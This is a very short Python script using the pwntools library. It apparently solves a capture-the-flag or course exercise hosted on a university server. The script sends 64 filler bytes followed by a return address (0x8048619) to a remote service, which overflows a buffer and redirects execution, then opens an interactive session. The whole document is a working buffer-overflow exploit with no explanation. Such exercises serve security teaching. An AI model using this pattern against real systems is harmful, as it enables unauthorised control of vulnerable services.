from pwn import *
import sys
p32(0x8048619)

host ='mustard.stt.rnl.tecnico.ulisboa.pt'
port = '9992'

s = b'A' * 64 + p32(0x8048619)

p = remote(host, port)
p.sendline(s)
p.interactive()